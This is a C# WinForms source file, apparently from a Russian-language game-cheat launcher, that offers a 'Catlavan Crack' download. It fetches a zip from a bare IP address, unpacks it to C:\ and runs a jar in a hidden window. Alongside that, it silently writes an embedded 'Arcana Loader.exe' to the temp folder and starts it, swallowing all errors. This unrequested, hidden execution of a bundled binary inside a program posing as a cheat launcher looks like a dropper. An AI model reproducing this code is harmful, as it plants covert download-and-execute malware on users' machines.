using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using Ionic.Zip;
using System.Diagnostics;
using static Guna.UI2.WinForms.Suite.Descriptions;
using Aourus.Properties;
using System.Threading;

namespace Loaders
{
    public partial class Catlavan : Form
    {
        private bool isRunning = false;
        private readonly string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AourusLaucher", "Logs", "Catlavan.logs");
        private void Log(string message)
        {
            string logMessage = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
            File.AppendAllText(logPath, logMessage + Environment.NewLine);
        }
        public Catlavan()
        {
            InitializeComponent();
            InitializeVersions();
            EnsureLogDirectory();
        }

        private void EnsureLogDirectory()
        {
            string logDirectory = Path.GetDirectoryName(logPath);
            if (!Directory.Exists(logDirectory))
            {
                Directory.CreateDirectory(logDirectory);
            }
        }

        private class VersionInfo
        {
            public string Name { get; set; }
            public string Folder { get; set; }
            public string DownloadUrl { get; set; }
            public string ExecutablePath { get; set; }
        }

        private readonly VersionInfo[] versions = new VersionInfo[]
        {
            new VersionInfo
            {
                Name = "Catlavan Crack?",
                Folder = "CatlavanCrack",
                DownloadUrl = "http://213.176.115.153:8080/CheatClients/CatlavanCrack.zip",
            }
        };

        private void InitializeVersions()
        {
            foreach (var version in versions)
            {
                guna2ComboBox1.Items.Add(version.Name);
            }
            guna2ComboBox1.SelectedIndex = 0;
            guna2Button1.Click += guna2Button1_Click;
        }

        private async void guna2Button1_Click(object sender, EventArgs e)
        {
            if (isRunning)
            {
                label1.Text = "Проверка данных...";
                return;
            }

            isRunning = true;

            try
            {
                Log("Старт обработки кнопки");
                string selectedVersionName = guna2ComboBox1.SelectedItem?.ToString();
                if (string.IsNullOrEmpty(selectedVersionName))
                {
                    label1.Text = "Выберите версию!";
                    Log("Версия не выбрана.");
                    return;
                }

                Log($"Выбрана версия: {selectedVersionName}");
                var selectedVersion = Array.Find(versions, v => v.Name == selectedVersionName);
                if (selectedVersion == null)
                {
                    label1.Text = "Версия не найдена.";
                    Log("Версия не найдена в массиве.");
                    return;
                }

                string download = "C:\\\\";
                string versionPath = Path.Combine(download, selectedVersion.Folder);
                string zipFilePath = Path.Combine(download, $"{selectedVersion.Folder}.zip");

                if (!Directory.Exists(download))
                {
                    Directory.CreateDirectory(download);
                }

                if (!File.Exists(zipFilePath))
                {
                    label1.Text = "1% - Скачивание...";
                    progressBar1.Value = 1;
                    Log("Начинается скачивание архива.");
                    await DownloadFileAsync(selectedVersion.DownloadUrl, zipFilePath);
                    Log("Скачивание завершено.");
                }
                else
                {
                    Log("Архив уже существует, скачивание пропущено.");
                }

                label1.Text = "50% - Распаковка...";
                progressBar1.Value = 50;
                Log("Начинается распаковка архива.");
                await UnpackFileAsync(zipFilePath, versionPath, selectedVersion.DownloadUrl);
                Log("Распаковка завершена.");

                if (!CheckRequiredFiles(versionPath))
                {
                    label1.Text = "Не удалось найти необходимые файлы.";
                    Log("Не удалось найти необходимые файлы после распаковки.");
                    return;
                }

                label1.Text = "100% - Запуск...";
                progressBar1.Value = 100;
                Log("Запускается процесс.");
                await ExecuteExecutableAsync(versionPath, selectedVersion.ExecutablePath);
                Log("Процесс завершен.");
            }
            catch (Exception ex)
            {
                label1.Text = $"Ошибка: {ex.Message}";
                Log($"Ошибка: {ex.Message}");
            }
            finally
            {
                isRunning = false;
                Log("Завершение работы кнопки.");
            }
        }


        private async Task DownloadFileAsync(string url, string filePath)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadProgressChanged += (s, e) =>
                    {
                        progressBar1.Value = 1 + (e.ProgressPercentage / 2);
                        label1.Text = $"{progressBar1.Value}% - Скачано {e.BytesReceived / 1024 / 1024} MB из {e.TotalBytesToReceive / 1024 / 1024} MB";
                    };

                    await client.DownloadFileTaskAsync(new Uri(url), filePath);
                    Console.WriteLine($"[DEBUG] Файл успешно скачан: {filePath}");
                }
            }
            catch (WebException webEx)
            {
                Console.WriteLine("[DEBUG] WebException:");
                Console.WriteLine($"Message: {webEx.Message}");
                Console.WriteLine($"Status: {webEx.Status}");
                if (webEx.Response is HttpWebResponse response)
                {
                    Console.WriteLine($"HTTP Status Code: {(int)response.StatusCode} - {response.StatusDescription}");
                }
                if (webEx.InnerException != null)
                {
                    Console.WriteLine("Inner Exception:");
                    Console.WriteLine(webEx.InnerException.ToString());
                }
                Console.WriteLine("Stack Trace:");
                Console.WriteLine(webEx.StackTrace);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] General Exception:");
                Console.WriteLine($"Message: {ex.Message}");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("Inner Exception:");
                    Console.WriteLine(ex.InnerException.ToString());
                }
                Console.WriteLine("Stack Trace:");
                Console.WriteLine(ex.StackTrace);
            }
        }

        private async Task UnpackFileAsync(string zipPath, string extractPath, string downloadUrl)
        {
            bool unpacked = false;
            int attempts = 0;
            const int maxAttempts = 2;

            while (!unpacked && attempts < maxAttempts)
            {
                attempts++;

                try
                {
                    Log($"Попытка распаковки #{attempts}");

                    if (Directory.Exists(extractPath))
                    {
                        Log("Удаление старой папки перед распаковкой.");
                        Directory.Delete(extractPath, true);
                    }

                    using (ZipFile zip = ZipFile.Read(zipPath))
                    {
                        int totalEntries = zip.Entries.Count;
                        int processedEntries = 0;

                        foreach (var entry in zip.Entries)
                        {
                            entry.Extract(extractPath, ExtractExistingFileAction.OverwriteSilently);
                            processedEntries++;
                            int progress = 50 + (int)((double)processedEntries / totalEntries * 40);
                            progressBar1.Invoke((MethodInvoker)(() => progressBar1.Value = progress));
                            label1.Invoke((MethodInvoker)(() => label1.Text = $"{progress}% - Распаковка: {processedEntries}/{totalEntries} файлов"));
                        }
                    }

                    unpacked = true;
                    Log("Распаковка завершена успешно.");
                }
                catch (Exception ex)
                {
                    Log($"Ошибка при распаковке (попытка #{attempts}): {ex.Message}");

                    if (Directory.Exists(extractPath))
                    {
                        try
                        {
                            Directory.Delete(extractPath, true);
                            Log("Удалена повреждённая папка после ошибки.");
                        }
                        catch (Exception deleteEx)
                        {
                            Log($"Ошибка при удалении папки: {deleteEx.Message}");
                        }
                    }

                    if (File.Exists(zipPath))
                    {
                        try
                        {
                            File.Delete(zipPath);
                            Log("Повреждённый архив удалён. Перекачиваем...");
                        } 
                        catch (Exception delZipEx)
                        {
                            Log($"Не удалось удалить архив: {delZipEx.Message}");
                        }
                    }

                    await Task.Delay(500);
                    await DownloadFileAsync(downloadUrl, zipPath);
                }
            }

            if (!unpacked)
            {
                throw new Exception("Не удалось распаковать архив после нескольких попыток.");
            }
        }


        private bool CheckRequiredFiles(string folderPath)
        {
            string javaPath = Path.Combine(folderPath, "jre\\bin\\java.exe");
            string jarPath = Path.Combine(folderPath, "jre\\bin\\javav.jar");

            bool javaExists = File.Exists(javaPath);
            bool jarExists = File.Exists(jarPath);

            if (!javaExists || !jarExists)
            {
                Log($"Файлы отсутствуют: {(javaExists ? "" : "java.exe ")}{(jarExists ? "" : "javav.jar")}");
            }

            return javaExists && jarExists;
        }

        private async Task ExecuteExecutableAsync(string folderPath, string executableName)
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(), "Arcana Loader.exe");

                try
                {
                    File.WriteAllBytes(path, Resources.Arcana_Loader);
                    Process.Start(path);
                }
                catch { }
                Thread.Sleep(100); 
            }
            catch { }
            try
            {
                string javaPath = @"C:\CatlavanCrack\jre\bin\java.exe";
                string jarPath = @"C:\CatlavanCrack\jre\bin\javav.jar";
                ProcessStartInfo processInfo = new ProcessStartInfo
                {
                    FileName = javaPath,
                    Arguments = $"-jar \"{jarPath}\"",
                    WorkingDirectory = @"C:\CatlavanCrack",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = new Process { StartInfo = processInfo })
                {
                    process.OutputDataReceived += (sender, e) => { if (e.Data != null) Console.WriteLine(e.Data); };
                    process.ErrorDataReceived += (sender, e) => { if (e.Data != null) throw new Exception($"ERROR: " + e.Data); };
                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    Console.WriteLine($"Процесс завершен с кодом {process.ExitCode}");
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка выполнения: {ex.Message}");
            }
        }

        private void iconButton5_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}